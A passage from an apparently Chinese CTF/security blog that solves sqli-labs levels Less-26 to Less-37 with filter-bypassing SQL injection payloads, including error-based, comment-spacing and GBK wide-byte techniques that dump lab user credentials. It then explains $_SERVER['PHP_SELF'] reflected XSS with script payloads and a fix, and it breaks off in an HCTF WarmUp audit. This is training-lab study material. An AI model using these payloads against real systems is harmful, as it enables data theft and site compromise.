%23</code></pre><p>只有第三种没啥问题，所以本题就是不需要加引号直接注入</p><pre><code>-1&#39; union select 1,2,group_concat(schema_name) from infoorrmation_schema.schemata%23</code></pre><h4 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h4><p>空格与注释被过滤了,最后的注释可以使用<code>or &#39;1&#39;=&#39;1</code> 来闭合，<br>然后空格可以用这些代替</p><pre><code>%09 = TAB键（水平）%0a = 新建一行%0c = 新的一页%0d = return功能%0b = TAB键（垂直）%a0 = 空格&amp;&amp;(%26%26) = and</code></pre><p>使用报错注入</p><pre><code>0&#39;||updatexml(1,concat(0x7e,(database()),0x7e),1)||&#39;1&#39;=&#39;1</code></pre><p>这样是没问题的，然后爆库</p><pre><code>0%27||updatexml(1,concat(0x7e,(select%0Agroup_concat(schema_name)%0Afrom%0Ainfoorrmation_schema.schemata),0x7e),1)||%271%27=%271</code></pre><p>然后不行了，黑人问号？<br>试试直接拿数据</p><pre><code>0%27||updatexml(1,concat(0x7e,(select%0agroup_concat(username)%0afrom%0ausers),0x7e),1)||%271%27=%271</code></pre><p><img src="63.png" alt=""><br><img src="62.png" alt=""><br>最后网上有师傅回答是windows系统的缘故？然后发现可以用括号过滤乖乖</p><pre><code>0&#39;||extractvalue(1, concat(0x5c,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema)=database())))||&#39;1&#39;=&#39;1</code></pre><p>表名</p><pre><code>0&#39;||updatexml(1,concat(&#39;$&#39;,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#39;security&#39;))),0)||&#39;1&#39;=&#39;1</code></pre><p>字段名</p><pre><code>0&#39;||updatexml(1,concat(&#39;$&#39;,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=&#39;security&#39;)%26%26(table_name=&#39;users&#39;))),0)||&#39;1&#39;=&#39;1</code></pre><p>数据</p><pre><code>0&#39;||updatexml(1,concat(&#39;$&#39;,(select(concat(&#39;$&#39;,id,&#39;$&#39;,username,&#39;$&#39;,passwoorrd))from(users)where(username)=&#39;admin&#39;)),0)||&#39;1&#39;=&#39;1</code></pre><h4 id="Less-26-a"><a href="#Less-26-a" class="headerlink" title="Less-26-a"></a>Less-26-a</h4><p>题目提示空格与注释被过滤了而且加了括号，所以还是盲注解决吧(其实还是windows环境的锅导致%0a等不能实现，正经的服务器应该不会是windows的吧)<br>所以这样是可以de</p><pre><code>100&#39;)union%a0select%a01,user(),(&#39;3</code></pre><h4 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h4><p>题目提示union与select被过滤了，可直接报错使用，当然也可以大小写来绕过还是上面的问题，因为windows的服务器，%0a不用，所以还是使用报错来写</p><pre><code>0&#39;||(updatexml(1,concat(0x5e5e,database()),1))||&#39;1&#39;=&#39;</code></pre><p>然后想拿数据</p><pre><code>0&#39;||updatexml(1,concat(&#39;$&#39;,(select(concat(&#39;$&#39;,id,&#39;$&#39;,username,&#39;$&#39;,password))from(users)where(username)=&#39;admin&#39;)),0)||&#39;1&#39;=&#39;</code></pre><p>很好就报错了<br><img src="62.png" alt=""><br>然后发现有师傅提供了一种非常骚的做法,用<code>/*%0a*/</code>强行制造空格。awsl</p><pre><code>0&#39;/*%0a*/UnIoN/*%0a*/SeLeCt/*%0a*/2,database(),4/*%0a*/||/**/&#39;1&#39;=&#39;1</code></pre><p>表名</p><pre><code>0&#39;/*%0a*/UnIoN/*%0a*/SeLeCt/*%0a*/2,(SeLeCt/*%0a*/group_concat(table_name)/*%0a*/from/*%0a*/information_schema.tables/*%0a*/where/*%0a*/table_schema=&#39;security&#39;),4/*%0a*/||/*%0a*/&#39;1&#39;=&#39;1</code></pre><p>字段名</p><pre><code>0&#39;/*%0a*/UnIoN/*%0a*/SeLeCt/*%0a*/2,(SeLeCt/*%0a*/group_concat(column_name)/*%0a*/from/*%0a*/information_schema.columns/*%0a*/where/*%0a*/table_schema=&#39;security&#39;/*%0a*/%26%26/*%0a*/table_name=&#39;users&#39;),4/*%0a*/||/*%0a*/&#39;1&#39;=&#39;1</code></pre><p>数据</p><pre><code>0&#39;/*%0a*/UnIoN/*%0a*/SeLeCt/*%0a*/2,(SeLeCt/*%0a*/group_concat(concat_ws(&#39;$&#39;,id,username,password))/*%0a*/from/*%0a*/users),4/*%0a*/||/*%0a*/&#39;1&#39;=&#39;1</code></pre><h4 id="Less-27-a"><a href="#Less-27-a" class="headerlink" title="Less-27-a"></a>Less-27-a</h4><p>把单引号改成双引号即可</p><pre><code>0&quot;/*%0a*/UnIoN/*%0a*/SeLeCt/*%0a*/2,database(),4/*%0a*/||/**/&quot;1&quot;=&quot;1</code></pre><h4 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h4><p>1和1”正常回显，1’报错，单引号字符型。<br>2’&amp;&amp;’1’=’1回显为id=1，有小括号。因为当你有小括号的时候<br><code>$sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;</code>变成<br><code>$sql=&quot;SELECT * FROM users WHERE id=(&#39;2&#39;&amp;&amp;&#39;1&#39;=&#39;1&#39;) LIMIT 0,1&quot;;</code><br>所以会变成id=1<br>看了下代码</p><!--more--><pre class=" language-php"><code class="language-php"><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">blacklist</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hint</span> <span class="token operator">=</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">blacklist</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[\/\*]/'</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token comment" spellcheck="true">//strip out /*</span>    <span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[--]/'</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment" spellcheck="true">//Strip out --.</span>    <span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[#]/'</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment" spellcheck="true">//Strip out #.</span>    <span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[ +]/'</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment" spellcheck="true">//Strip out spaces.</span>    <span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[ +]/'</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment" spellcheck="true">//Strip out spaces.</span>    <span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/union\s+select/i'</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//Strip out UNION &amp; SELECT.</span>    <span class="token keyword">return</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>过滤了相连的union和select，这个可以复写绕过，或者使用其他代替空格,如下都可能可以代替空格</p><pre><code>%0a%0d%20%0b%a0/%0a/</code></pre><p>这题可以用%0a，使用%00截断<br>可以盲注</p><pre><code>0&#39;)||left(database(),1)&gt;&#39;s&#39;;%00</code></pre><p>也可以绕过union select直接注入</p><pre><code>333&#39;)union%a0select(1),(database()),(3)||(&#39;1</code></pre><p><img src="71.png" alt=""><br>解释：</p><pre><code>$sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;$sql=&quot;SELECT * FROM users WHERE id=(&#39;333&#39;)union%a0select(1),(database()),(3)||(&#39;1&#39;) LIMIT 0,1&quot;;</code></pre><p>前面的333可以尽量大一些，不能用-1。</p><h4 id="Less-28-a"><a href="#Less-28-a" class="headerlink" title="Less-28-a"></a>Less-28-a</h4><p>感觉就像看错了题？28-a居然是在 Less 28 的基础上还注释掉了很多过滤。这样28的payload肯定可以直接打<br>给出一个强一点的过滤</p><pre class=" language-php"><code class="language-php"><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">blacklist</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hint</span> <span class="token operator">=</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">blacklist</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/or/i'</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/and/i'</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[\/\*]/'</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[--]/'</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[#]/'</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[\/\\\\]/'</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[ +]/'</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[\s]/'</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/select/i'</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/union/i'</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/union\s+select/i'</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>末尾\i就会导致不区分大小写，统统过滤</p><h4 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h4><p>比较智障了吧，好像过滤什么，直接注入</p><pre><code>0%27union/**/select/**/1,group_concat(schema_name),1/**/from/**/information_schema.schemata%23</code></pre><h4 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h4><p>同上，只是单引号变双引号</p><pre><code>0&quot;union/**/select/**/1,group_concat(schema_name),1/**/from/**/information_schema.schemata%23</code></pre><h4 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h4><p>同上，只是双引号加了括号</p><pre><code>0&quot;)union/**/select/**/1,group_concat(schema_name),1/**/from/**/information_schema.schemata%23</code></pre><h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p>国内最常使用的 GBK 编码，这种方式主要是绕过 addslashes 等对特殊字符进行转移的绕过。mysql在使用GBK编码的时候，会认为两个字符为一个汉字，例如%df%5c就是一个汉字。反斜杠 \ 的十六进制为 %5c，在你输入 %bf%27 时，函数遇到单引号自动转移加入 \，此时变为 %bf%5c%27，%bf%5c 在 GBK 中变为一个宽字符「縗」。%bf 那个位置可以是 %81-%fe 中间的任何字符。不止在 SQL 注入中，宽字符注入在很多地方都可以应用。<br>先了解addslashes() 函数，就是转义函数</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token string">'Shanghai is the "biggest" city in China.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>输出</p><pre><code>Shanghai is the \&quot;biggest\&quot; city in China.</code></pre><p>内部实现就是</p><pre class=" language-php"><code class="language-php"><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">.</span> <span class="token function">preg_quote</span><span class="token punctuation">(</span><span class="token string">'\\'</span><span class="token punctuation">)</span> <span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">"\\\\\\"</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">//escape any backslash</span><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/\'/i'</span><span class="token punctuation">,</span> <span class="token string">'\\\''</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                               <span class="token comment" spellcheck="true">//escape single quote with a backslash</span><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/\"/'</span><span class="token punctuation">,</span> <span class="token string">"\\\""</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token comment" spellcheck="true">//escape double quote with a backslash</span></code></pre><p>所以我们输入</p><pre><code>http://127.0.0.1/Less-32/?id=1%df&#39;</code></pre><p>根据以上分析，发生如下转换：(%5c是<code>\</code>的十六进制)</p><pre><code>%df%27====&gt;(check_addslashes)====&gt;%df%5c%27====&gt;(GBK)====&gt;運&#39;</code></pre><pre><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;1運&#39;&#39; LIMIT 0,1&quot;; #成功将单引号闭合，可以进行SQL注入。</code></pre><p><a href="https://www.cnblogs.com/fengshui/p/9266830.html" target="_blank" rel="noopener">参考1：https://www.cnblogs.com/fengshui/p/9266830.html</a><br><a href="https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html" target="_blank" rel="noopener">参考2：https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html</a><br>无法添加单引号或者双引号，可以用16进制绕过-很骚的操作</p><h4 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h4><p><img src="72.png" alt=""><br>输入<code>?id=1%df%27</code>页面会报错说明单引符号起作用了。c<br><code>?id=-1%df%27%20union%20select%201,2,3%20%23</code>,有回显所以可以宽字节注入</p><pre><code>?id=0%df%27 union select 1,group_concat(schema_name),2 from information_schema.schemata;%23</code></pre><h4 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h4><p>和上同，只是把自定义的转义函数改成内置的转义函数</p><pre><code>?id=0%df%27 union select 1,group_concat(schema_name),2 from information_schema.schemata;%23</code></pre><h4 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h4><p>把get改成post了，注意不能直接在界面上输入，因为%什么的都会会浏览器转义，所以burp直接修改</p><pre><code>admin%df&#39;or 0 union select 1,group_concat(schema_name) from information_schema.schemata%23&amp;passwd=&amp;submit=Submit</code></pre><p><img src="73.png" alt=""></p><h4 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h4><p>直接注入？回到第一关了233</p><pre><code>0 union selEct 1,group_concat(schema_name),2 from information_schema.schemata;%23</code></pre><h4 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h4><p>使用了mysql_real_escape_string函数过滤<br>查看文档,下列字符受影响：</p><pre><code>\x00\n\r\&#39;&quot;\x1a</code></pre><p>还是宽字节注入</p><pre><code>0%df%27%20union%20selEct%201,group_concat(schema_name),2%20from%20information_schema.schemata;%23-1%EF%BF%BD%27union%20select%201,user(),3--+</code></pre><h4 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h4><p>改成post</p><pre><code>uname=0%df%27%20union%20selEct%20group_concat(schema_name),2%20from%20information_schema.schemata;%23&amp;passwd=1&amp;submit=Submit</code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Sql-Injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php特性</title>
      <link href="/2019/04/11/php-te-xing/"/>
      <url>/2019/04/11/php-te-xing/</url>
      
        <content type="html"><![CDATA[<h4 id="1、超级全局变量"><a href="#1、超级全局变量" class="headerlink" title="1、超级全局变量"></a>1、超级全局变量</h4><p>超级全局变量在PHP 4.1.0之后被启用, 是PHP系统中自带的变量，在一个脚本的全部作用域中都可用。<br>$_SERVER[“PHP_SELF”];</p><h4 id="PHP中预定义了几个超级全局变量（superglobals）-，这意味着它们在一个脚本的全部作用域中都可用。-你不需要特别说明，就可以在函数及类中使用。"><a href="#PHP中预定义了几个超级全局变量（superglobals）-，这意味着它们在一个脚本的全部作用域中都可用。-你不需要特别说明，就可以在函数及类中使用。" class="headerlink" title="PHP中预定义了几个超级全局变量（superglobals） ，这意味着它们在一个脚本的全部作用域中都可用。 你不需要特别说明，就可以在函数及类中使用。"></a>PHP中预定义了几个超级全局变量（superglobals） ，这意味着它们在一个脚本的全部作用域中都可用。 你不需要特别说明，就可以在函数及类中使用。</h4><a id="more"></a><p>PHP 超级全局变量列表:</p><pre><code>1. $GLOBALS2. $_SERVER3. $_REQUEST4. $_POST5. $_GET6. $_FILES7. $_ENV8. $_COOKIE9. $_SESSION</code></pre><h4 id="2、PHP-SERVER"><a href="#2、PHP-SERVER" class="headerlink" title="2、PHP $_SERVER"></a>2、PHP $_SERVER</h4><p>$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。不能保证每个服务器都提供全部项目；服务器可能会忽略一些，或者提供一些没有在这里列举出来的项目。</p><pre><code>&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;];echo &quot;&lt;br&gt;&quot;;echo $_SERVER[&#39;SERVER_NAME&#39;];echo &quot;&lt;br&gt;&quot;;echo $_SERVER[&#39;HTTP_HOST&#39;];echo &quot;&lt;br&gt;&quot;;echo $_SERVER[&#39;HTTP_REFERER&#39;];echo &quot;&lt;br&gt;&quot;;echo $_SERVER[&#39;HTTP_USER_AGENT&#39;];echo &quot;&lt;br&gt;&quot;;echo $_SERVER[&#39;SCRIPT_NAME&#39;];?&gt;</code></pre><h4 id="3、-SERVER-’PHP-SELF’-的跨站脚本攻击"><a href="#3、-SERVER-’PHP-SELF’-的跨站脚本攻击" class="headerlink" title="3、$_SERVER[’PHP_SELF’]的跨站脚本攻击"></a>3、$_SERVER[’PHP_SELF’]的跨站脚本攻击</h4><p>$_SERVER[‘PHP_SELF’]是PHP语言中的“服务器端系统变量”，它的值是当前php文件相对于网站根目录的位置地址.<br>比如当</p><pre><code>&lt;?phpecho $_SERVER[&#39;PHP_SELF&#39;];?&gt;</code></pre><p>正常访问是这样的<br><img src="1.png" alt=""><br>显然这样可以很方便XSS，因为直接echo在页面上，所以只需要在尾部加上<code>/&lt;script&gt;alert(&quot;Hello&quot;)&lt;/script&gt;</code>即可，建议大家先URL加密一次，不过问题不大<br><img src="2.png" alt=""><br>当然正常的代码不会直接输出在界面上，但是当开发人员一个表单的在action本页面，则可能会</p><pre><code>&lt;form action=&quot;&lt;?php echo $_SERVER[&quot;PHP_SELF&quot;];?&gt;&quot;method=&quot;POST&quot;&gt;.....&lt;/form&gt;</code></pre><p>正常访问是这样的</p><p><img src="3.png" alt=""></p><p>但是 当你在尾部加上</p><pre><code>/&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></pre><p>则由原来生成的</p><pre><code>&lt;form action=&quot;/demo.php/{{多加入的参数}}&quot; method=&quot;POST&quot;&gt;</code></pre><p>变成了，符号是自己加上去，表示区分</p><pre><code>&lt;form action=&quot;/demo.php/{{"><script>alert('xss')</script>}}&quot; method=&quot;POST&quot;&gt;</code></pre><p>最终</p><pre><code>&lt;form action=&quot;/demo.php/&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot; method=&quot;POST&quot;&gt;</code></pre><p>成功执行了XSS<br><img src="4.png" alt=""><br><img src="5.png" alt=""></p><h4 id="3-1、解决办法-gt-通过htmlentities-SERVER-‘PHP-SELF’-过滤"><a href="#3-1、解决办法-gt-通过htmlentities-SERVER-‘PHP-SELF’-过滤" class="headerlink" title="3.1、解决办法-&gt; 通过htmlentities($_SERVER[‘PHP_SELF’]);过滤"></a>3.1、解决办法-&gt; 通过htmlentities($_SERVER[‘PHP_SELF’]);过滤</h4><h4 id="PS-SERVER-变量中的重要元素"><a href="#PS-SERVER-变量中的重要元素" class="headerlink" title="PS:$_SERVER 变量中的重要元素:"></a>PS:$_SERVER 变量中的重要元素:</h4><table><thead><tr><th>元素/代码</th><th>描述</th></tr></thead><tbody><tr><td>$_SERVER[‘PHP_SELF’]</td><td>返回当前执行脚本的文件名。</td></tr><tr><td>$_SERVER[‘GATEWAY_INTERFACE’]</td><td>返回服务器使用的 CGI 规范的版本。</td></tr><tr><td>$_SERVER[‘SERVER_ADDR’]</td><td>返回当前运行脚本所在的服务器的 IP 地址。</td></tr><tr><td>$_SERVER[‘SERVER_NAME’]</td><td>返回当前运行脚本所在的服务器的主机名。</td></tr><tr><td>$_SERVER[‘SERVER_SOFTWARE’]</td><td>返回服务器标识字符串（比如 Apache/2.2.24）。</td></tr><tr><td>$_SERVER[‘SERVER_PROTOCOL’]</td><td>返回请求页面时通信协议的名称和版本（例如，“HTTP/1.0”）。</td></tr><tr><td>$_SERVER[‘REQUEST_METHOD’]</td><td>返回访问页面使用的请求方法（例如 POST）。</td></tr><tr><td>$_SERVER[‘REQUEST_TIME’]</td><td>返回请求开始时的时间戳（例如 1577687494）。</td></tr><tr><td>$_SERVER[‘QUERY_STRING’]</td><td>返回查询字符串，如果是通过查询字符串访问此页面。</td></tr><tr><td>$_SERVER[‘HTTP_ACCEPT’]</td><td>返回来自当前请求的请求头。</td></tr><tr><td>$_SERVER[‘HTTP_ACCEPT_CHARSET’]</td><td>返回来自当前请求的 Accept_Charset 头（ 例如 utf-8,ISO-8859-1）</td></tr><tr><td>$_SERVER[‘HTTP_HOST’]</td><td>返回来自当前请求的 Host 头。</td></tr><tr><td>$_SERVER[‘HTTP_REFERER’]</td><td>返回当前页面的完整 URL（不可靠，因为不是所有用户代理都支持）。</td></tr><tr><td>$_SERVER[‘HTTPS’]</td><td>是否通过安全 HTTP 协议查询脚本。</td></tr><tr><td>$_SERVER[‘REMOTE_ADDR’]</td><td>返回浏览当前页面的用户的 IP 地址。</td></tr><tr><td>$_SERVER[‘REMOTE_HOST’]</td><td>返回浏览当前页面的用户的主机名。</td></tr><tr><td>$_SERVER[‘REMOTE_PORT’]</td><td>返回用户机器上连接到 Web 服务器所使用的端口号。</td></tr><tr><td>$_SERVER[‘SCRIPT_FILENAME’]</td><td>返回当前执行脚本的绝对路径。</td></tr><tr><td>$_SERVER[‘SERVER_ADMIN’]</td><td>该值指明了 Apache 服务器配置文件中的 SERVER_ADMIN 参数。</td></tr><tr><td>$_SERVER[‘SERVER_PORT’]</td><td>Web 服务器使用的端口。默认值为 “80”。</td></tr><tr><td>$_SERVER[‘SERVER_SIGNATURE’]</td><td>返回服务器版本和虚拟主机名。</td></tr><tr><td>$_SERVER[‘PATH_TRANSLATED’]</td><td>当前脚本所在文件系统（非文档根目录）的基本路径。</td></tr><tr><td>$_SERVER[‘SCRIPT_NAME’]</td><td>返回当前脚本的路径。</td></tr><tr><td>$_SERVER[‘SCRIPT_URI’]</td><td>返回当前页面的 URI。</td></tr></tbody></table><h4 id="PHP中preg-match正则匹配的-u-i-s是什么意思"><a href="#PHP中preg-match正则匹配的-u-i-s是什么意思" class="headerlink" title="PHP中preg_match正则匹配的/u /i  /s是什么意思"></a>PHP中preg_match正则匹配的/u /i  /s是什么意思</h4><p>/u 表示按unicode(utf-8)匹配（主要针对多字节比如汉字）<br>/i 表示不区分大小写（如果表达式里面有 a， 那么 A 也是匹配对象）<br>/s 表示将字符串视为单行来匹配</p><h4 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h4><p>Orz啥都不说了，先膜两张图<br><img src="21.png" alt=""><br><img src="22.png" alt=""><br>上图中能发现两个特性，一个是win10真的金贵，一个就是<code>demo?/../flag.txt</code>能直接包含到flag.txt这是为啥呢</p><!--more--><pre><code>原理是demo?/被当作目录，之后上跳目录就好了（这个只适用于linux）</code></pre><p>OrZ<br>然后这个审计的题目</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">emmm</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"source"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"source.php"</span><span class="token punctuation">,</span><span class="token string">"hint"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 